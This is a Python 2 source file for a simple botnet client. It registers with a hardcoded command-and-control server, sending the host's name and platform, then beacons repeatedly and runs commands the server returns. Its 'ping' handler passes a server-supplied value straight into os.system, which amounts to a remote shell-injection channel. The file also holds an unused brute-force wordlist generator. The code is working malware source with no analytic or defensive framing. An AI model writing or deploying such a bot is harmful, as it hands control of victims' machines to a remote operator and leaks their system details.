import httplib, urllib, socket, hashlib, time, platform, os
from string import ascii_uppercase, ascii_lowercase, digits
from itertools import product


class Bot(object):
    def __init__(self):
        self.hostname = socket.gethostname()
        self.plat = platform.platform()
        self.seed = self.hostname + self.plat
        self.id = hashlib.md5(self.seed).hexdigest()
        self.c2 = 'cgboal.xyz'
        print self.register()
        self.quit = False
        self.main()



    def main(self):
        time.sleep(2)
        prev = None
        while not self.quit:
            resp = self.beacon()
            print resp
            cmd = self.parseCmd(resp)
            if cmd != None:
                 if cmd[0] == self.id or cmd[0] == '*' and resp != prev:
                    prev = resp
                    if cmd[1] == 'ping':
                        params = {'botId': self.id, 'botName' : self.hostname, 'host': cmd[2], 'up': False}
                        alive = os.system("ping -c 3 " + cmd[2])
                        if alive == 0:
                            print '[+]Host Up'
                            params['up'] = True
                        self.post(params, '/ping/')
                    elif cmd[1] == 'quit':
                        self.quit = True
                 time.sleep(10)
            else:
                time.sleep(2)




    def register(self):
        t = int(time.time())
        regParams = {"botId": self.id, "botName": self.hostname, 'platform' : self.plat, 't' : t }
        return self.post(regParams, '/reg/').read()

    def beacon(self):
        t = int(time.time())
        bParams = {'botId' : self.id, 't' : t}
        return self.post(bParams, '/beacon/').read()

    def parseCmd(self, resp):
        if "DOCTYPE" in resp:
            return None
        resp.strip()
        cmd = resp.split('::')
        return cmd

    def post(self, params, path):
        conn = httplib.HTTPConnection(self.c2)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept" : "text/plain"}
        params['auth'] = self.genTimeSeed()
        params = urllib.urlencode(params)
        conn.request('POST', path, params, headers)
        return conn.getresponse()

    def get(self, path):
        conn = httplib.HTTPConnection(self.c2)
        conn.request('GET', path)
        return conn.getresponse()


    def genTimeSeed(self):
        seed = self.roundDown(int(time.time()), 5)
        return hashlib.md5(str(seed)).hexdigest()

    def roundDown(self, num, factor):
        return num - (num%factor)

    def genWordList(self, low, high):
        chars = ascii_lowercase + ascii_uppercase + digits
        for n in range(low, high):
            for comb in product(chars, repeat=n):
                string = "".join(comb)
                yield string

if __name__ == "__main__":
    bot = Bot()